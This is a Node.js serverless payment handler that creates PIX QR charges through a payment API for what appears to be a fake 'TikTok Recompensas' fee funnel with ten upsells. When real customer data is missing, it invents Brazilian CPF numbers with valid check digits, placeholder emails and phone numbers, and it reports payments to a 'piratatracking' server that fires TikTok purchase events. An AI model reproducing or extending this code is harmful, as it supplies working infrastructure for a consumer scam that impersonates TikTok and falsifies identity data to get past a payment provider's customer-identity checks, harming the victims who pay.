const PINPAY_TOKEN = process.env.PINPAY_TOKEN;
const PINPAY_BASE  = 'https://api.usepinpay.com/functions/v1/api-v1';

function generateCPF() {
  const n = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10));
  let d1 = n.reduce((acc, v, i) => acc + v * (10 - i), 0);
  d1 = 11 - (d1 % 11);
  if (d1 >= 10) d1 = 0;
  let d2 = n.reduce((acc, v, i) => acc + v * (11 - i), 0) + d1 * 2;
  d2 = 11 - (d2 % 11);
  if (d2 >= 10) d2 = 0;
  return n.join('') + d1 + d2;
}

function cleanName(nome) {
  const partes = String(nome || 'Cliente').trim().split(/\s+/).filter(Boolean);
  if (partes.length >= 2) return partes[0] + ' ' + partes[partes.length - 1];
  return partes[0] || 'Cliente';
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });

  if (!PINPAY_TOKEN) {
    return res.status(500).json({ success: false, error: 'PINPAY_TOKEN (sk_live_...) nao configurada nas variaveis do servidor Vercel.' });
  }

  try {
    let b = req.body || {};
    if (typeof b === 'string') {
      try { b = JSON.parse(b); } catch (e) { b = {}; }
    }

    // Catálogo de preços válidos (em centavos) — qualquer valor fora disso é rejeitado.
    // Cada valor corresponde a uma oferta real do funil (página 5 + upsells 1 a 10).
    const VALID_AMOUNTS_CENTS = new Set([
      2000, // oferta principal (pagina 5) - NOVO valor R$20,00
      1500, // oferta reduzida (back) - NOVO valor R$15,00
      1934, // oferta principal antiga (pagina 5) - mantido por precaucao
      2074, // pagina 4 (exibicao, propaga pra 5)
      2400, // upsell 1
      2600, // upsell 2
      2500, // upsell 3
      2200, // upsell 4
      3276, // upsell 5
      3893, // upsell 6
      2442, // upsell 7
      1946, // upsell 8
      1473, // upsell 9
      4631, // upsell 10
      1998  // fallback interno de algumas paginas
    ]);

    const amountReais = parseFloat(b.amount || b.valor || b.taxa);
    if (!amountReais || amountReais <= 0) {
      return res.status(400).json({ success: false, error: 'amount invalido' });
    }
    const amountCents = Math.round(amountReais * 100);

    if (!VALID_AMOUNTS_CENTS.has(amountCents)) {
      console.warn('[generate_qr_gateway] BLOQUEADO - valor fora do catalogo: R$' + amountReais + ' (' + amountCents + ' centavos)');
      return res.status(400).json({ success: false, error: 'Valor de oferta invalido' });
    }

    const nomeCompleto = cleanName(b.name || b.nome);
    let email = (b.email && String(b.email).trim()) || ('cliente' + Date.now() + '@gmail.com');
    let documentStr = (b.document && String(b.document).replace(/\D/g, '')) || generateCPF();
    if (documentStr.length < 11) documentStr = generateCPF();
    let phone = String(b.phone || b.phone_number || '11999999999').replace(/\D/g, '');
    if (phone.length < 10) phone = '11999999999';

    const externalRef = b.reference || ('TK-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8));

    // Webhook: notifica o VPS ao confirmar o pagamento → dispara Purchase server-side no TikTok
    const WEBHOOK_URL = 'https://api.piratatracking.online/api/webhooks/universal?token=wh_t18r28wl42k84lpe3bwpo7_1789739165126';

    const payload = {
      amount: amountCents,
      description: 'TikTok Recompensas - Taxa',
      webhook_url: WEBHOOK_URL,
      customer: {
        name: nomeCompleto,
        email: email,
        document: { number: documentStr },
        phone: phone
      },
      metadata: {
        external_reference: externalRef,
        reference: b.reference || null,
        checkoutSessionId: b.reference || null,
        checkout_url: b.url_full || ((req.headers['x-forwarded-proto'] || 'https') + '://' + (req.headers.host || 'localhost'))
      }
    };

    console.log('[generate_qr_gateway] Enviando para PinPay | R$' + amountReais + ' | ' + nomeCompleto);

    // AbortController com timeout de 8s para evitar que a função Vercel esgote (10s limit)
    // sem retornar JSON — o que causava "Erro de conexão" no frontend
    const controller = new AbortController();
    const timeoutId = setTimeout(function() { controller.abort(); }, 8000);

    let response, data;
    try {
      response = await fetch(PINPAY_BASE + '/pix', {
        method: 'POST',
        headers: {
          'Authorization': 'Bearer ' + PINPAY_TOKEN.trim(),
          'Content-Type': 'application/json',
          'Idempotency-Key': externalRef
        },
        body: JSON.stringify(payload),
        signal: controller.signal
      });
      data = await response.json().catch(() => ({}));
    } catch (fetchErr) {
      clearTimeout(timeoutId);
      if (fetchErr.name === 'AbortError') {
        console.error('[generate_qr_gateway] TIMEOUT ao chamar PinPay (>8s)');
        return res.status(504).json({ success: false, error: 'Gateway timeout. Tente novamente.' });
      }
      throw fetchErr;
    }
    clearTimeout(timeoutId);

    if (!response.ok || !data.id) {
      console.error('[generate_qr_gateway] PinPay erro:', response.status, JSON.stringify(data));
      return res.status(502).json({ success: false, error: 'Erro ao criar PIX na PinPay', details: data });
    }

    const txId = String(data.id);
    const pixCode = (data.pix && data.pix.qr_code) || '';
    const qrImg = (data.pix && data.pix.qr_code_url) || '';

    console.log('[generate_qr_gateway] PinPay OK | tx=' + txId);

    // Associa o txId da PinPay ao checkoutSessionId no VPS (AWAITED — não fire-and-forget)
    // Garante que o webhook encontre a sessão de rastreamento com ttclid/ttp
    // IMPORTANTE: deve ser awaited antes do return, senão Vercel mata o fetch antes de completar
    await fetch('https://api.piratatracking.online/api/register-payment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: externalRef, transaction_id: txId })
    }).catch(() => {});

    return res.status(201).json({
      success: true,
      transactionKey: txId,
      payment_code: txId,
      pix_copy_paste: pixCode,
      pix_code: pixCode,
      qrCodeText: pixCode,
      qrCodeImage: qrImg,
      amount: amountReais,
      price_label: b.price_label || ('R$ ' + amountReais.toFixed(2).replace('.', ',')),
      expires_at: (data.pix && data.pix.expires_at) || (Date.now() + 10 * 60 * 1000)
    });
  } catch (err) {
    console.error('[generate_qr_gateway] ERRO:', err.message);
    return res.status(500).json({ success: false, error: err.message });
  }
};
